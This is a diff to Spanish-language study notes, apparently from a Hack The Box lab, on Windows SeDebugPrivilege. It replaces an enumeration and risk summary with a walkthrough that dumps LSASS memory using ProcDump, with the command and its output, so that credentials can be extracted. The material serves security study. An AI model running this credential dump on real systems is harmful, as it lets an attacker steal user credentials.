@@ -27,47 +27,37 @@ Por ejemplo:
 
 ---
 
-## Enumeración
+# Volcado de LSASS con ProcDump (SeDebugPrivilege)
 
-**Comando:**
+Tras iniciar sesión como un usuario al que se le asignó el derecho **Debug programs** y abrir una shell elevada, comprobamos que **SeDebugPrivilege** aparece listado.
 
-```
-whoami /priv
-```
+```cmd
+C:\htb> whoami /priv
 
-Permite comprobar si el token del usuario actual incluye `SeDebugPrivilege`.
+PRIVILEGES INFORMATION
+----------------------
 
-**Ubicación en políticas locales:**
-
-```
-secpol.msc → Local Policies → User Rights Assignment → Debug programs
-```
-
-**Por defecto:**
-
-```
-Administrators: tienen SeDebugPrivilege
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
 ```
 
----
+Podemos usar **ProcDump** del paquete Sysinternals para aprovechar este privilegio y volcar la memoria de un proceso. Un buen candidato es el proceso **Local Security Authority Subsystem Service (LSASS)**, que almacena credenciales de usuario tras el inicio de sesión.
 
-## Riesgo y abuso
+```cmd
+C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
-Un usuario con este privilegio puede:
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
 
-* Acceder a la memoria de procesos del sistema como **LSASS**.
-* Volcar credenciales.
-* Inyectar o modificar el comportamiento de procesos críticos.
+[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
+[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
+[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
+[15:25:46] Dump count reached.
+```
 
-Por ello, conceder SeDebugPrivilege equivale prácticamente a otorgar **control total** sobre el sistema.
+Este procedimiento genera un volcado de memoria (`lsass.dmp`) que puede analizarse posteriormente en un entorno controlado para extraer credenciales o validar el impacto del privilegio **SeDebugPrivilege** en la seguridad del sistema.
 
-
----
-
-## Resumen
-
-* **Privilegio:** SeDebugPrivilege
-* **Ruta GPO:** Computer Settings → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Debug programs
-* **Por defecto:** Administrators
-* **Riesgo:** acceso a procesos del sistema y potencial escalada de privilegios
-* **Comprobación:** `whoami /priv`
